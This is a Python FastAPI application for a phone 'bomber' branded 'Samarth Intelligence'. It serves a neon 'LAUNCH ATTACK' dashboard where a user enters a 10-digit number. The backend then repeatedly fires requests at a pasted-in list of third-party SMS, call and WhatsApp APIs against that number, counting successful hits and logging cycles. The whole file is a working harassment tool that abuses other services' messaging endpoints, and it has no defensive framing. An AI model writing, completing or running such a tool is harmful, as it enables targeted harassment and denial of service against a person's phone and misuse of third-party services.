from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

ULTIMATE_APIS = [ # Paste all your APIs here
]

attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} → {msg}")
    if len(attack_status["logs"]) > 25: attack_status["logs"].pop()

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(method=api["method"], url=api["url"], headers=api["headers"], data=data, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
    except: pass

async def run_attack(phone):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call":0,"SMS":0,"WhatsApp":0}
    add_log("ATTACK INITIALIZED")
    async with aiohttp.ClientSession() as session:
        while attack_status["running"]:
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"Cycle {attack_status['cycles']} | APIs Fired")
            await asyncio.sleep(2)
    add_log("ATTACK TERMINATED")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samarth Intelligence</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap');
        body { background: #02040a; font-family: 'Inter', sans-serif; }
        .title { font-family: 'Space Grotesk', sans-serif; letter-spacing: -2px; }
        .neon-cyan { text-shadow: 0 0 20px #22d3ee, 0 0 40px #22d3ee, 0 0 60px #67e8f9; }
        .glass { background: rgba(5, 10, 30, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(103, 232, 249, 0.3); }
        .glow { box-shadow: 0 0 40px rgba(103, 232, 249, 0.5); }
    </style>
</head>
<body class="text-white min-h-screen flex items-center justify-center">
    <div id="splash" class="max-w-md w-full px-6">
        <div class="glass rounded-3xl p-12 text-center glow">
            <div class="mx-auto w-20 h-20 bg-gradient-to-br from-cyan-400 to-blue-500 rounded-2xl flex items-center justify-center mb-8 shadow-2xl">
                ⚡
            </div>
            <h1 class="title text-5xl font-bold neon-cyan">SAMARTH</h1>
            <p class="text-cyan-400 tracking-[4px] text-sm mt-1">INTELLIGENCE v2026</p>
            
            <div class="mt-12 space-y-3 text-left text-sm font-mono text-slate-300">
                <div>> Initializing Samarth core...</div>
                <div>> Establishing secure tunnel...</div>
                <div>> Authenticating session...</div>
                <div class="text-emerald-400">> Connection established.</div>
                <div class="text-emerald-400">> System ready.</div>
            </div>

            <button onclick="enterSystem()" 
                    class="mt-12 w-full bg-gradient-to-r from-cyan-500 to-blue-600 py-6 rounded-2xl text-lg font-semibold tracking-wider hover:brightness-110 transition">
                ENTER SYSTEM
            </button>
            
            <div class="text-[10px] text-slate-500 mt-8">• SECURE • PRIVATE • AUTHORIZED ACCESS •</div>
        </div>
    </div>

    <!-- Main Dashboard (hidden initially) -->
    <div id="dashboard" class="max-w-md w-full px-6 hidden">
        <div class="glass rounded-3xl p-8 glow">
            <div class="flex justify-between items-center mb-8">
                <div class="title text-3xl neon-cyan">BOMBER</div>
                <div id="status" class="text-emerald-400 text-xs font-mono bg-emerald-900/30 px-4 py-2 rounded-full">ONLINE</div>
            </div>

            <input id="phone" maxlength="10" class="w-full bg-zinc-950 border border-cyan-500/50 focus:border-cyan-400 rounded-2xl px-8 py-7 text-4xl font-mono text-center tracking-widest outline-none" placeholder="9876543210">

            <div class="mt-8 grid grid-cols-2 gap-4">
                <button onclick="startAttack()" id="startBtn" class="bg-gradient-to-r from-cyan-500 to-blue-600 py-7 rounded-2xl text-lg font-bold glow">LAUNCH ATTACK</button>
                <button onclick="stopAttack()" id="stopBtn" class="hidden bg-red-600 py-7 rounded-2xl text-lg font-bold">STOP</button>
            </div>

            <div class="mt-10 grid grid-cols-3 gap-4 text-center">
                <div><div id="calls" class="text-4xl font-bold text-orange-400">0</div><div class="text-xs text-slate-400">CALLS</div></div>
                <div><div id="sms" class="text-4xl font-bold text-sky-400">0</div><div class="text-xs text-slate-400">SMS</div></div>
                <div><div id="wa" class="text-4xl font-bold text-emerald-400">0</div><div class="text-xs text-slate-400">WA</div></div>
            </div>

            <div class="mt-8">
                <div class="text-xs text-slate-400 flex justify-between mb-2"><span>CYCLES</span><span id="cycles">0</span></div>
                <div class="h-2 bg-zinc-900 rounded-full"><div id="progress" class="h-2 bg-cyan-400 w-0 transition-all"></div></div>
            </div>

            <div class="mt-8">
                <div class="text-xs text-cyan-400 mb-3">LIVE LOGS</div>
                <div id="logs" class="font-mono text-xs h-48 overflow-y-auto bg-black/60 p-4 rounded-2xl"></div>
            </div>
        </div>
    </div>

    <script>
        function enterSystem() {
            document.getElementById("splash").classList.add("hidden");
            document.getElementById("dashboard").classList.remove("hidden");
        }

        let isRunning = false;
        async function startAttack() {
            const phone = document.getElementById("phone").value.trim();
            if (phone.length !== 10) return alert("Enter valid 10 digit number");
            const res = await fetch("/start", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({phone})});
            if ((await res.json()).status === "success") {
                isRunning = true;
                document.getElementById("startBtn").classList.add("hidden");
                document.getElementById("stopBtn").classList.remove("hidden");
                pollStatus();
            }
        }
        async function stopAttack() {
            await fetch("/stop", {method:"POST"});
            isRunning = false;
            document.getElementById("startBtn").classList.remove("hidden");
            document.getElementById("stopBtn").classList.add("hidden");
        }
        function pollStatus() {
            if (!isRunning) return;
            fetch("/status").then(r => r.json()).then(d => {
                document.getElementById("calls").textContent = d.stats.Call || 0;
                document.getElementById("sms").textContent = d.stats.SMS || 0;
                document.getElementById("wa").textContent = d.stats.WhatsApp || 0;
                document.getElementById("cycles").textContent = d.cycles;
                document.getElementById("progress").style.width = Math.min(d.cycles*7%100+25,100)+"%";
                document.getElementById("logs").innerHTML = d.logs.map(l => `<div>${l}</div>`).join('');
                setTimeout(pollStatus, 1400);
            });
        }
    </script>
</body>
</html>
    """
    return html

@app.post("/start")
async def start(phone: Phone):
    if len(phone.phone) != 10: return {"status": "error"}
    if attack_status["running"]: return {"status": "error"}
    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone)), daemon=True).start()
    return {"status": "success"}

@app.post("/stop")
async def stop():
    attack_status["running"] = False
    return {"status": "success"}

@app.get("/status")
async def status():
    return {
        "running": attack_status["running"],
        "cycles": attack_status["cycles"],
        "stats": attack_status["stats"],
        "logs": attack_status["logs"][:20]
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
